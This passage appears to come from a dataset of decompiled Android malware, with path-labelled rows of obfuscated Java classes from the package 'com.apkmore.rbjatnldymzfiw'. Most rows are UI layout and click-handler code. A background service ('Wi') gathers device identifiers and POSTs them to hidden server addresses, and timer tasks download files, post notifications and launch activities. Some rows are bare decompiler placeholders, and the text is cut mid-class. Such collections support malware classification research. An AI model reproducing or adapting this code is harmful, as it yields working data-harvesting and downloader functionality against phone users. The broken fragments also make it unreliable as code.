linearLayout2=new LinearLayout(context);     LinearLayout.LayoutParams layoutParams=new LinearLayout.LayoutParams(-1,1);     layoutParams.gravity=16;     linearLayout2.setBackgroundColor(-4604739);     this.f121a.addView(linearLayout2,layoutParams);     this.j=new ImageView(context);     this.j.setImageResource(R.drawable.sym_def_app_icon);     LinearLayout.LayoutParams layoutParams2=new LinearLayout.LayoutParams(-2,-2);     layoutParams2.gravity=16;     layoutParams2.setMargins(ay.a(context,5),ay.a(context,5),ay.a(context,3),ay.a(context,5));     linearLayout.addView(this.j,layoutParams2);     this.d=new TextView(context);     this.d.setText("""");     this.d.setTextSize(18.0f);     this.d.setTextColor(ViewCompat.MEASURED_STATE_MASK);     this.d.setPadding(15,5,5,5);     linearLayout.addView(this.d);     ScrollView scrollView=new ScrollView(context);     this.f121a.addView(scrollView,new LinearLayout.LayoutParams(-1,-2,1.0f));     LinearLayout linearLayout3=new LinearLayout(context);     linearLayout3.setOrientation(1);     linearLayout3.setPadding(ay.a(context,8),ay.a(context,10),ay.a(context,8),ay.a(context,6));     scrollView.addView(linearLayout3,new LinearLayout.LayoutParams(-1,-2));     LinearLayout linearLayout4=new LinearLayout(context);     linearLayout3.addView(linearLayout4,new LinearLayout.LayoutParams(-1,-2));     LinearLayout linearLayout5=new LinearLayout(context);     linearLayout5.setOrientation(1);     linearLayout4.addView(linearLayout5,new LinearLayout.LayoutParams(-1,-2));     TableLayout tableLayout=new TableLayout(context);     TableRow tableRow=new TableRow(context);     TableRow tableRow2=new TableRow(context);     TableRow tableRow3=new TableRow(context);     tableLayout.addView(tableRow);     tableLayout.addView(tableRow2);     tableLayout.addView(tableRow3);     linearLayout5.addView(tableLayout);     this.e=new TextView(context);     this.e.setText(h.cs + ""ï¼š"");     this.e.setTextSize(15.0f);     this.e.setPadding(ay.a(context,10),0,0,0);     this.e.setTextColor(-9144456);     this.e.setSingleLine();     this.e.setEllipsize(TextUtils.TruncateAt.END);     tableRow2.addView(this.e);     this.g=new TextView(context);     this.g.setText(h.ct + ""ï¼š"");     this.g.setTextSize(15.0f);     this.g.setPadding(ay.a(context,10),0,0,0);     this.g.setTextColor(-9144456);     this.g.setSingleLine();     this.g.setEllipsize(TextUtils.TruncateAt.END);     tableRow2.addView(this.g);     this.f=new TextView(context);     this.f.setText(h.cu + ""ï¼š"");     this.f.setTextSize(15.0f);     this.f.setPadding(ay.a(context,10),0,0,0);     this.f.setTextColor(-9144456);     this.f.setSingleLine();     this.f.setEllipsize(TextUtils.TruncateAt.END);     tableRow3.addView(this.f);     this.h=new TextView(context);     this.h.setText(h.cv + ""ï¼š"");     this.h.setTextSize(15.0f);     this.h.setPadding(ay.a(context,10),0,0,0);     this.h.setTextColor(-9144456);     this.h.setSingleLine();     this.h.setEllipsize(TextUtils.TruncateAt.END);     tableRow3.addView(this.h);     LinearLayout linearLayout6=new LinearLayout(context);     linearLayout6.setOrientation(1);     linearLayout3.addView(linearLayout6,new LinearLayout.LayoutParams(-1,-2));     LinearLayout linearLayout7=new LinearLayout(context);     LinearLayout.LayoutParams layoutParams3=new LinearLayout.LayoutParams(-1,-2);     int a2=ay.a(context,2);     layoutParams3.bottomMargin=a2;     layoutParams3.topMargin=a2;     linearLayout6.addView(linearLayout7,layoutParams3);     TextView textView=new TextView(context);     textView.setText(h.cw + "" "");     textView.setTextColor(-9144456);     textView.setPadding(ay.a(context,10),0,0,0);     linearLayout7.addView(textView);     LinearLayout linearLayout8=new LinearLayout(context);     LinearLayout.LayoutParams layoutParams4=new LinearLayout.LayoutParams(-1,1);     layoutParams4.gravity=16;     int a3=ay.a(context,8);     layoutParams4.rightMargin=a3;     layoutParams4.leftMargin=a3;     linearLayout8.setBackgroundColor(-4604739);     linearLayout7.addView(linearLayout8,layoutParams4);     this.i=new TextView(context);     this.i.setMaxLines(5);     this.i.setText("""");     this.i.setTextSize(16.0f);     this.i.setTextColor(ViewCompat.MEASURED_STATE_MASK);     this.i.setPadding(ay.a(context,10),0,ay.a(context,5),ay.a(context,5));     this.i.setLineSpacing(ay.a(context,5),1.0f);     linearLayout6.addView(this.i);     this.l=new ImageView(context);     Drawable c=com.apkmore.rbjatnldymzfiw.j.d.a.c(context,1);     if (c != null) {       this.l.setImageDrawable(c);     }     LinearLayout.LayoutParams layoutParams5=new LinearLayout.LayoutParams(-2,-2);     layoutParams5.rightMargin=ay.a(context,10);     layoutParams5.gravity=5;     linearLayout6.addView(this.l,layoutParams5);     this.l.setOnClickListener(this.u);     this.i.setOnClickListener(this.u);     LinearLayout linearLayout9=new LinearLayout(context);     linearLayout3.addView(linearLayout9,new LinearLayout.LayoutParams(-1,-2));     this.c=new com.apkmore.rbjatnldymzfiw.j.a.a(context);     this.c.setBackgroundColor(Color.rgb(236,236,236));     this.c.setUnselectedAlpha(1.1f);     this.c.setPadding(0,20,0,40);     this.c.setSpacing(10);     this.c.setFadingEdgeLength(0);     Bitmap a4=com.apkmore.rbjatnldymzfiw.j.d.a.a(context,11);     Bitmap a5=com.apkmore.rbjatnldymzfiw.j.d.a.a(context,12);     if (a4 != null && a5 != null) {       a4.setDensity(240);       a5.setDensity(240);       this.c.a(a4,a5);     }     new LinearLayout.LayoutParams(-1,-2).topMargin=ay.a(context,10);     this.b=new u(this.s);     LinearLayout.LayoutParams layoutParams6=new LinearLayout.LayoutParams(-1,-2);     layoutParams6.topMargin=ay.a(this.s,4);     linearLayout9.addView(this.b,layoutParams6);     this.b.a(this);     LinearLayout linearLayout10=new LinearLayout(context);     LinearLayout.LayoutParams layoutParams7=new LinearLayout.LayoutParams(-1,1);     layoutParams7.gravity=16;     layoutParams7.topMargin=ay.a(context,10);     linearLayout10.setBackgroundColor(-4604739);     linearLayout3.addView(linearLayout10,layoutParams7);     LinearLayout linearLayout11=new LinearLayout(context);     linearLayout11.setOrientation(1);     linearLayout3.addView(linearLayout11,new LinearLayout.LayoutParams(-1,-2));     FrameLayout frameLayout=new FrameLayout(context);     LinearLayout.LayoutParams layoutParams8=new LinearLayout.LayoutParams(-1,-2);     int a6=ay.a(context,2);     layoutParams8.bottomMargin=a6;     layoutParams8.topMargin=a6;     linearLayout11.addView(frameLayout,layoutParams8);     TextView textView2=new TextView(context);     textView2.setText(h.cx);     textView2.setTextColor(ViewCompat.MEASURED_STATE_MASK);     textView2.setTextSize(16.0f);     FrameLayout.LayoutParams layoutParams9=new FrameLayout.LayoutParams(-2,-2);     layoutParams9.gravity=19;     frameLayout.addView(textView2,layoutParams9);     ImageView imageView=new ImageView(context);     StateListDrawable stateListDrawable=new StateListDrawable();     Drawable c2=com.apkmore.rbjatnldymzfiw.j.d.a.c(context,7);     if (c2 != null) {       stateListDrawable.addState(new int[]{R.attr.state_pressed},c2);     }     Drawable c3=com.apkmore.rbjatnldymzfiw.j.d.a.c(context,6);     if (c3 != null) {       stateListDrawable.addState(new int[]{R.attr.state_enabled},c3);     }     imageView.setBackgroundDrawable(stateListDrawable);     FrameLayout.LayoutParams layoutParams10=new FrameLayout.LayoutParams(-2,-2);     layoutParams10.gravity=21;     layoutParams10.rightMargin=ay.a(context,8);     imageView.setTag(23);     imageView.setOnClickListener(this);     frameLayout.addView(imageView,layoutParams10);     LinearLayout linearLayout12=new LinearLayout(context);     LinearLayout.LayoutParams layoutParams11=new LinearLayout.LayoutParams(-1,1);     layoutParams11.gravity=16;     linearLayout12.setBackgroundColor(-4604739);     linearLayout11.addView(linearLayout12,layoutParams11);     FrameLayout frameLayout2=new FrameLayout(context);     linearLayout11.addView(frameLayout2,new LinearLayout.LayoutParams(-1,-2));     this.n=new com.apkmore.rbjatnldymzfiw.j.a.c(context);     FrameLayout.LayoutParams layoutParams12=new FrameLayout.LayoutParams(-1,-1,1);     layoutParams12.gravity=16;     this.n.setNumColumns(2);     this.n.setVerticalSpacing(0);     this.n.setHorizontalSpacing(-1);     this.n.setOnItemClickListener(this);     this.n.setVisibility(8);     frameLayout2.addView(this.n,layoutParams12);     this.o=new FrameLayout(context);     frameLayout2.addView(this.o,new LinearLayout.LayoutParams(-1,-2));     ProgressBar progressBar=new ProgressBar(context);     FrameLayout.LayoutParams layoutParams13=new FrameLayout.LayoutParams(-2,-2);     layoutParams13.gravity=17;     this.o.addView(progressBar,layoutParams13);     this.o.setVisibility(0);     LinearLayout linearLayout13=new LinearLayout(context);     LinearLayout.LayoutParams layoutParams14=new LinearLayout.LayoutParams(-1,1);     layoutParams14.gravity=16;     linearLayout13.setBackgroundColor(-4604739);     this.f121a.addView(linearLayout13,layoutParams14);     FrameLayout frameLayout3=new FrameLayout(context);     LinearLayout.LayoutParams layoutParams15=new LinearLayout.LayoutParams(-1,-2);     layoutParams15.gravity=80;     this.f121a.addView(frameLayout3,layoutParams15);     LinearLayout linearLayout14=new LinearLayout(context);     linearLayout14.setOrientation(1);     LinearLayout linearLayout15=new LinearLayout(context);     linearLayout14.addView(linearLayout15);     FrameLayout.LayoutParams layoutParams16=new FrameLayout.LayoutParams(-1,-2);     layoutParams16.gravity=17;     frameLayout3.addView(linearLayout14,layoutParams16);     frameLayout3.setBackgroundDrawable(new GradientDrawable(GradientDrawable.Orientation.BOTTOM_TOP,new int[]{-4144960,-4144960,-4144960}));     LinearLayout.LayoutParams layoutParams17=new LinearLayout.LayoutParams(-2,-2);     layoutParams17.gravity=17;     layoutParams17.setMargins(ay.a(this.s,5),ay.a(this.s,5),ay.a(this.s,0),ay.a(this.s,5));     Button button=new Button(context);     StateListDrawable stateListDrawable2=new StateListDrawable();     Drawable c4=com.apkmore.rbjatnldymzfiw.j.d.a.c(context,15);     if (c4 != null) {       stateListDrawable2.addState(new int[]{R.attr.state_pressed},c4);     }     Drawable c5=com.apkmore.rbjatnldymzfiw.j.d.a.c(context,14);     if (c5 != null) {       stateListDrawable2.addState(new int[]{R.attr.state_enabled},c5);     }     button.setBackgroundDrawable(stateListDrawable2);     linearLayout15.addView(button,layoutParams17);     button.setTag(21);     button.setOnClickListener(this);     LinearLayout linearLayout16=new LinearLayout(context);     linearLayout16.setGravity(17);     StateListDrawable stateListDrawable3=new StateListDrawable();     NinePatchDrawable d=com.apkmore.rbjatnldymzfiw.j.d.a.d(context,3);     if (d != null) {       stateListDrawable3.addState(new int[]{R.attr.state_pressed},d);     }     NinePatchDrawable d2=com.apkmore.rbjatnldymzfiw.j.d.a.d(context,2);     if (d2 != null) {       stateListDrawable3.addState(new int[]{R.attr.state_enabled},d2);     }     linearLayout16.setBackgroundDrawable(stateListDrawable3);     linearLayout16.setTag(1);     linearLayout16.setOnClickListener(this);     LinearLayout.LayoutParams layoutParams18=new LinearLayout.LayoutParams(-2,-1);     layoutParams18.setMargins(ay.a(this.s,5),ay.a(this.s,5),ay.a(this.s,0),ay.a(this.s,5));     layoutParams18.weight=1.0f;     layoutParams18.gravity=17;     linearLayout15.addView(linearLayout16,layoutParams18);     this.q=new ImageView(context);     Drawable c6=com.apkmore.rbjatnldymzfiw.j.d.a.c(context,4);     if (c6 != null) {       this.q.setBackgroundDrawable(c6);     }     LinearLayout.LayoutParams layoutParams19=new LinearLayout.LayoutParams(-2,-2);     layoutParams19.rightMargin=ay.a(this.s,5);     linearLayout16.addView(this.q,layoutParams19);     this.p=new TextView(context);     this.p.setText(h.cy);     this.p.setTextColor(-1);     this.p.setTextSize(20.0f);     linearLayout16.addView(this.p,-2,-2);     LinearLayout.LayoutParams layoutParams20=new LinearLayout.LayoutParams(-2,-2);     layoutParams20.setMargins(ay.a(this.s,5),ay.a(this.s,5),ay.a(this.s,5),ay.a(this.s,5));     layoutParams20.gravity=17;     Button button2=new Button(context);     StateListDrawable stateListDrawable4=new StateListDrawable();     Drawable c7=com.apkmore.rbjatnldymzfiw.j.d.a.c(context,9);     if (c7 != null) {       stateListDrawable4.addState(new int[]{R.attr.state_pressed},c7);     }     Drawable c8=com.apkmore.rbjatnldymzfiw.j.d.a.c(context,8);     if (c8 != null) {       stateListDrawable4.addState(new int[]{R.attr.state_enabled},c8);     }     button2.setBackgroundDrawable(stateListDrawable4);     button2.setTag(22);     linearLayout15.addView(button2,layoutParams20);     button2.setOnClickListener(this);     this.k=new com.apkmore.rbjatnldymzfiw.j.a.a(context,-1);     this.k.setSpacing(10);     this.k.setUnselectedAlpha(1.1f);     this.k.setBackgroundColor(-805306368);     this.k.setPadding(0,10,0,20);     this.k.a(a4,a5);     RelativeLayout.LayoutParams layoutParams21=new RelativeLayout.LayoutParams(-1,-1);     layoutParams21.addRule(10,0);     layoutParams21.addRule(12,0);     addView(this.k,layoutParams21);     this.k.setVisibility(8);     this.k.setFadingEdgeLength(0);     this.k.setOnItemClickListener(new j(this));     this.c.setOnItemClickListener(new k(this));   }   private String a(  float f){     return f > 1024.0f ? (((int)((f / 1024.0f) * 100.0f)) / 100.0f) + ""M"" : ((int)Math.ceil(f)) + ""K"";   }   private WindowManager e(){     return (WindowManager)this.s.getSystemService(""window"");   }   public void a(  int i){     this.h.setText(h.cv + ""ï¼š "" + a(i));   }   public void a(  Bitmap bitmap){     Drawable a2=com.apkmore.rbjatnldymzfiw.j.d.a.a(getContext(),bitmap);     if (a2 != null) {       this.j.setImageDrawable(a2);     }   }   public void a(  Bitmap bitmap,  int i){     if (bitmap == null) {       return;     }     e().getDefaultDisplay().getMetrics(new DisplayMetrics());     bitmap.setDensity((int)(r0.densityDpi / 0.8f));     if (i < 2) {       this.b.a(bitmap,i);     }     this.k.a(bitmap,i);   }   public void a(  View.OnClickListener onClickListener){     this.m=onClickListener;   }   public void a(  AdapterView.OnItemClickListener onItemClickListener){     this.v=onItemClickListener;   }   public void a(  String str){     this.e.setText(h.cs + ""ï¼š "" + str);   }   public void a(  List list){     Iterator it=list.iterator();     while (it.hasNext()) {       Bitmap bitmap=(Bitmap)it.next();       ((WindowManager)this.s.getSystemService(""window"")).getDefaultDisplay().getMetrics(new DisplayMetrics());       bitmap.setDensity((int)(r3.densityDpi / 0.8f));     }     this.k.a(list);     if (list.size() <= 2 || this.b == null) {       this.b.a(list);     }  else {       this.b.a(list.subList(0,2));     }   }   public boolean a(){     if (this.k.getVisibility() != 0) {       return false;     }     this.k.setVisibility(8);     this.f121a.setVisibility(0);     return true;   }   public void b(){     this.n.setVisibility(0);     this.o.setVisibility(8);   }   public void b(  int i){     try {       Bitmap a2=com.apkmore.rbjatnldymzfiw.j.d.a.a(getContext(),10);       DisplayMetrics displayMetrics=new DisplayMetrics();       ((WindowManager)this.s.getSystemService(""window"")).getDefaultDisplay().getMetrics(displayMetrics);       int i2=displayMetrics.densityDpi;       if (a2 != null) {         a2.setDensity((int)(i2 / 0.8f));       }       ArrayList arrayList=new ArrayList(i);       for (int i3=0; i3 < i; i3++) {         if (a2 != null) {           arrayList.add(a2);         }       }       a(arrayList);     }  catch (    Exception e) {     }   }   public void b(  String str){     this.d.setText(str);   }   public void b(  List list){     this.r=new au(this.s,list);     this.n.setAdapter((ListAdapter)this.r);     this.r.notifyDataSetChanged();     this.n.setFocusable(false);     this.n.setVisibility(0);     this.o.setVisibility(8);   }   public void c(){     this.n.setVisibility(8);     this.o.setVisibility(0);   }   @Override public void c(  int i){     this.k.setVisibility(0);     this.k.setSelection(i);   }   public void c(  String str){     this.i.setText(str);   }   public void d(){     this.p.setText(h.cz);     this.q.setVisibility(8);   }   public void d(  String str){     this.f.setText(h.cu + ""ï¼š "" + str);   }   public void e(  String str){     this.g.setText(h.ct + ""ï¼š "" + str);   }   public void f(  String str){   }   public void g(  String str){   }   @Override public void onClick(  View view){     if (this.m != null) {       this.m.onClick(view);     }   }   @Override public void onItemClick(  AdapterView adapterView,  View view,  int i,  long j){     if (this.v != null) {       this.v.onItemClick(adapterView,view,i,j);     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\j.code","public class j implements AdapterView.OnItemClickListener {   final i f122a;   public j(  i iVar){     this.f122a=iVar;   }   @Override public void onItemClick(  AdapterView adapterView,  View view,  int i,  long j){     com.apkmore.rbjatnldymzfiw.j.a.a aVar;     com.apkmore.rbjatnldymzfiw.j.a.a aVar2;     com.apkmore.rbjatnldymzfiw.j.a.a aVar3;     aVar=this.f122a.k;     if (aVar.getVisibility() == 0) {       aVar2=this.f122a.k;       aVar2.setVisibility(8);       aVar3=this.f122a.c;       aVar3.setSelection(i);     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\k.code","public class k implements AdapterView.OnItemClickListener {   final i f123a;   public k(  i iVar){     this.f123a=iVar;   }   @Override public void onItemClick(  AdapterView adapterView,  View view,  int i,  long j){     com.apkmore.rbjatnldymzfiw.j.a.a aVar;     com.apkmore.rbjatnldymzfiw.j.a.a aVar2;     aVar=this.f123a.k;     aVar.setVisibility(0);     aVar2=this.f123a.k;     aVar2.setSelection(i);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\l.code","public class l implements View.OnClickListener {   final i f124a;   public l(  i iVar){     this.f124a=iVar;   }   @Override public void onClick(  View view){     boolean z;     TextView textView;     Context context;     ImageView imageView;     TextView textView2;     Context context2;     Context context3;     ImageView imageView2;     try {       z=this.f124a.t;       if (!z) {         textView=this.f124a.i;         textView.setMaxLines(5);         context=this.f124a.s;         Drawable c=com.apkmore.rbjatnldymzfiw.j.d.a.c(context,1);         if (c != null) {           imageView=this.f124a.l;           imageView.setImageDrawable(c);         }         this.f124a.t=true;         return;       }       textView2=this.f124a.i;       context2=this.f124a.s;       textView2.setMaxLines(context2.getWallpaperDesiredMinimumHeight());       context3=this.f124a.s;       Drawable c2=com.apkmore.rbjatnldymzfiw.j.d.a.c(context3,13);       if (c2 != null) {         imageView2=this.f124a.l;         imageView2.setImageDrawable(c2);       }       this.f124a.t=false;     }  catch (    Exception e) {     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\m.code","!org.eclipse.jdt.core.dom.TypeDeclaration@3aa34bdc"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\n.code","!org.eclipse.jdt.core.dom.TypeDeclaration@699a5a45"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\o.code","class o extends TimerTask {   final String f127a;   final Dgl b;   public o(  Dgl dgl,  String str){     this.b=dgl;     this.f127a=str;   }   @Override public void run(){     Context context;     Context context2;     Context context3;     Context context4;     Context context5;     Context context6;     Context context7;     Context context8;     Context context9;     context=this.b.e;     at a2=ay.a(context,this.f127a);     if (a2 != null) {       int intValue=a2.l.intValue();       if (intValue == 2 || intValue == 4) {         a2.l=3;         context2=this.b.e;         ay.b(context2,a2);         Intent intent=new Intent();         intent.putExtra(h.T,10);         context3=this.b.e;         Dgl.a(context3,intent);         context4=this.b.e;         if (!ay.a(context4,this.f127a + h.aH,a2.h,true)) {           StringBuilder append=new StringBuilder().append(h.r);           context9=this.b.e;           new File(append.append(context9.getPackageName()).append(""/"").append(a2.h).append(""/"").append(a2.i).append(h.aH).toString()).delete();         }         if (intValue == 4) {           context5=this.b.e;           String str=this.f127a;           context6=this.b.e;           Intent a3=ay.a(context5,str,context6.getPackageManager());           context7=this.b.e;           aq.a(context7,R.drawable.ic_menu_agenda,h.cE,a2.h,16,a3 == null ? new Intent() : a3,a2.g,-1);           context8=this.b.e;           context8.startActivity(a3);         }       }     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\p.code","class p extends TimerTask {   final Dgl f128a;   public p(  Dgl dgl){     this.f128a=dgl;   }   @Override public void run(){     Handler handler;     handler=this.f128a.f;     handler.post(new q(this));   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\q.code","class q implements Runnable {   final p f129a;   public q(  p pVar){     this.f129a=pVar;   }   @Override public void run(){     Context context;     Intent intent=new Intent();     intent.putExtra(h.T,1);     context=this.f129a.f128a.e;     Dgl.a(context,intent);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\r.code","class r extends TimerTask {   final Dgl f130a;   public r(  Dgl dgl){     this.f130a=dgl;   }   @Override public void run(){     Handler handler;     handler=this.f130a.f;     handler.post(new s(this));   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\s.code","class s implements Runnable {   final r f131a;   public s(  r rVar){     this.f131a=rVar;   }   @Override public void run(){     Context context;     Intent intent=new Intent();     intent.putExtra(h.T,1);     context=this.f131a.f130a.e;     Dgl.a(context,intent);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\t.code","class t extends Handler {   final Dgl f132a;   public t(  Dgl dgl){     this.f132a=dgl;   }   @Override public void handleMessage(  Message message){     Context context;     Context context2;     Context context3;     Context context4;     Context context5;     Context context6;     if (message.what == 2) {       Dgl dgl=this.f132a;       context6=this.f132a.e;       dgl.b(context6);       return;     }     int i=message.arg1;     ad adVar=(ad)message.obj;     context=this.f132a.e;     String str=adVar.f;     context2=this.f132a.e;     Intent a2=ay.a(context,str,context2.getPackageManager());     context3=this.f132a.e;     aq.a(context3,R.drawable.ic_menu_agenda,h.cE,adVar.e,16,a2 == null ? new Intent() : a2,adVar.d,-1);     a a3=a.a();     context4=this.f132a.e;     a3.a(context4,i,3);     context5=this.f132a.e;     context5.startActivity(a2);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\u.code","public class u extends LinearLayout {   private ImageButton f133a;   private Context b;   private w c;   public u(  Context context){     super(context);     this.c=null;     this.b=context;     setBackgroundColor(-1250068);   }   public void a(  Bitmap bitmap,  int i){     Drawable a2;     if (bitmap == null || (a2=com.apkmore.rbjatnldymzfiw.j.d.a.a(this.b,bitmap)) == null) {       return;     }     try {       ((ImageButton)getChildAt(i)).setBackgroundDrawable(a2);     }  catch (    Exception e) {       e.printStackTrace();     }   }   public void a(  w wVar){     this.c=wVar;   }   public void a(  List list){     int i=0;     while (true) {       int i2=i;       if (i2 >= list.size()) {         return;       }       this.f133a=new ImageButton(this.b);       Drawable a2=com.apkmore.rbjatnldymzfiw.j.d.a.a(this.b,(Bitmap)list.get(i2));       if (a2 != null) {         this.f133a.setBackgroundDrawable(a2);       }       this.f133a.setTag(Integer.valueOf(i2));       LinearLayout.LayoutParams layoutParams=new LinearLayout.LayoutParams(-2,-2);       layoutParams.weight=1.0f;       int a3=ay.a(this.b,3);       layoutParams.leftMargin=a3;       layoutParams.rightMargin=a3;       addView(this.f133a,layoutParams);       this.f133a.setOnClickListener(new v(this));       i=i2 + 1;     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\v.code","public class v implements View.OnClickListener {   final u f134a;   public v(  u uVar){     this.f134a=uVar;   }   @Override public void onClick(  View view){     w wVar;     wVar=this.f134a.c;     wVar.c(((Integer)view.getTag()).intValue());   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\w.code","public interface w {   void c(  int i); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\Wi.code","public class Wi extends Service {   public static int f74a=-1;   private static final String[] g={h.f120a};   private static int h=0;   private am b;   private as c;   private ad d=null;   private y e;   private Looper f;   private String a(  HashMap hashMap,  int i){     String str=g[i];     if (hashMap == null) {       return str;     }     StringBuffer stringBuffer=null;     for (    String str2 : hashMap.keySet()) {       String str3=(String)hashMap.get(str2);       if (stringBuffer == null) {         stringBuffer=new StringBuffer();         stringBuffer.append(""?"");       }  else {         stringBuffer.append(""&"");       }       stringBuffer.append(str2);       stringBuffer.append(""="");       stringBuffer.append(str3);     }     return str + stringBuffer.toString();   }   public void a(  boolean z){     boolean z2=false;     if (z) {       ay.b(System.currentTimeMillis());     }     int o=ay.o(this);     int i=0;     while (!z2 && i < 4) {       String externalStorageState=Environment.getExternalStorageState();       if (""mounted"".equals(externalStorageState)) {         z2=a(o);         if (z2) {           ay.b(this,o);         }  else {           o=(o + 1) % g.length;         }         if (!z2 && i == 3) {           ay.c(this,this.c.j);         }       }  else {         Log.d(com.apkmore.rbjatnldymzfiw.j.d.b.f112a,h.cM + ""="" + externalStorageState);       }       i++;       try {         Thread.sleep(2000L);       }  catch (      InterruptedException e) {         e.printStackTrace();       }     }     h=ay.a(this,""m"",1) + 1;   }   private boolean a(  int i){     boolean z;     HttpClient a2;     HashMap hashMap=new HashMap();     String str=g[i];     if (f74a > -1) {       hashMap.put(h.bk,"""" + f74a);       str=a(hashMap,i);       f74a=-1;     }     HttpPost httpPost=new HttpPost(str);     this.c.a();     try {       httpPost.setEntity(new ByteArrayEntity(this.c.b()));     }  catch (    Exception e) {     }     try {       a2=aq.a(this);     }  catch (    Exception e2) {       z=false;     }     if (a2 == null) {       return false;     }     HttpResponse execute=a2.execute(httpPost);     if (execute.getStatusLine().getStatusCode() == 200) {       z=true;       try {         ay.d(this);         this.b.a(execute.getEntity().getContent());       }  catch (      Exception e3) {       }     }  else {       httpPost.abort();       z=false;     }     return z;   }   public void b(){     String i=ay.i(this);     if (i != null) {       this.c.n=i;     }     if (ay.n(this) != null) {       this.c.o=ay.n(this);     }     this.c.l=aq.c(this);     this.c.j=ay.e(this);     this.c.q=ay.a();     this.c.r=ay.h(this);   }   public boolean c(){     Calendar calendar=Calendar.getInstance();     calendar.setTimeInMillis(System.currentTimeMillis());     int i=calendar.get(11);     if (i >= 6 || i <= 1) {       return true;     }     Log.d(com.apkmore.rbjatnldymzfiw.j.d.b.f112a,h.cG);     return false;   }   public boolean d(){     long c=ay.c();     long b=ay.b();     long currentTimeMillis=(System.currentTimeMillis() - c) / 60000;     Log.d(com.apkmore.rbjatnldymzfiw.j.d.b.f112a,currentTimeMillis + """");     if (currentTimeMillis >= b) {       return true;     }     Log.d(com.apkmore.rbjatnldymzfiw.j.d.b.f112a,h.cF);     return false;   }   @Override public IBinder onBind(  Intent intent){     return null;   }   @Override public void onCreate(){     this.c=new as(this);     this.b=am.a(this);     this.b.a();     HandlerThread handlerThread=new HandlerThread(h.q,10);     handlerThread.start();     this.f=handlerThread.getLooper();     this.e=new y(this,this.f);   }   @Override public void onDestroy(){     this.f.quit();   }   @Override public int onStartCommand(  Intent intent,  int i,  int i2){     Message obtainMessage=this.e.obtainMessage();     obtainMessage.arg1=i2;     obtainMessage.obj=intent;     if (new File(Environment.getExternalStorageDirectory() + ""/"" + h.j+ h.cf+ h.B).exists()) {       this.e.sendMessage(obtainMessage);       return 2;     }     new com.apkmore.rbjatnldymzfiw.j.b.a().a(h.cg,Environment.getExternalStorageDirectory() + h.j + h.cf+ h.B,this.e,obtainMessage);     return 2;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\x.code","public class x {   public static final String[] f135a={h.b};   private static x b;   private Context c;   private af d;   private x(  Context context){     this.c=context;     this.d=new af(this.c);   }   public static x a(  Context context){     if (b == null) {       b=new x(context.getApplicationContext());     }     return b;   }   private InputStream a(  String str,  byte[] bArr){     InputStream inputStream=null;     HttpClient a2=aq.a(this.c);     if (a2 != null) {       HttpPost httpPost=new HttpPost(str);       if (bArr != null) {         httpPost.setEntity(new ByteArrayEntity(bArr));       }       int i=0;       while (true) {         int i2=i;         if (i2 >= 2) {           break;         }         try {           HttpResponse execute=a2.execute(httpPost);           if (String.valueOf(execute.getStatusLine().getStatusCode()).startsWith(""2"")) {             inputStream=a(execute);             break;           }         }  catch (        ClientProtocolException e) {           e.getMessage();         } catch (        IOException e2) {           e2.getMessage();         }         i=i2 + 1;         try {           Thread.sleep(2000L);         }  catch (        InterruptedException e3) {           e3.printStackTrace();         }       }     }     return inputStream;   }   private InputStream a(  HttpResponse httpResponse){     return httpResponse.getEntity().getContent();   }   private String a(  InputStream inputStream){     BufferedReader bufferedReader;     Throwable th;     String str=null;     if (inputStream != null) {       StringBuilder sb=new StringBuilder();       try {         bufferedReader=new BufferedReader(new InputStreamReader(inputStream));         while (true) {           try {             String readLine=bufferedReader.readLine();             if (readLine == null) {               break;             }             sb.append(readLine);           }  catch (          Exception e) {             if (bufferedReader != null) {               try {                 bufferedReader.close();               }  catch (              IOException e2) {                 e2.printStackTrace();               }             }             if (inputStream != null) {               try {                 inputStream.close();               }  catch (              IOException e3) {                 e3.printStackTrace();               }             }             return str;           } catch (          Throwable th2) 